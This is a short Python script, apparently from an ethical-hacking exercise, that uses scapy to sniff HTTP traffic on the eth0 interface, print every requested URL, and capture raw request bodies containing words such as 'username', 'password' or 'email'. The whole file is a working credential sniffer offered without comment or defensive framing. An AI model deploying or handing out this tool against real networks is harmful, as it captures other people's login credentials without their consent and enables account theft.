#!/usr/bin/env python
import scapy.all as scapy
from scapy.layers import http
def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)

def get_url(packet):
    if (packet.haslayer(http.HTTPRequest)):
        url = packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
        return url
def get_login_info(packet):
    if (packet.haslayer(http.HTTPRequest)):
        if (packet.haslayer(scapy.Raw)):
            load = packet[scapy.Raw].load
            keywords = ["username", "user", "login", "password", "Password", "pass", "Email", "Password","Login"]
            for keyword in keywords:
                if keyword in load:
                    return load

def process_sniffed_packet(packet):
    url = get_url(packet)
    login = get_login_info(packet)
    if login:
        print(login + "\n\n\n\n")
    if url:
        print(url + "\n\n\n\n")

sniff("eth0")
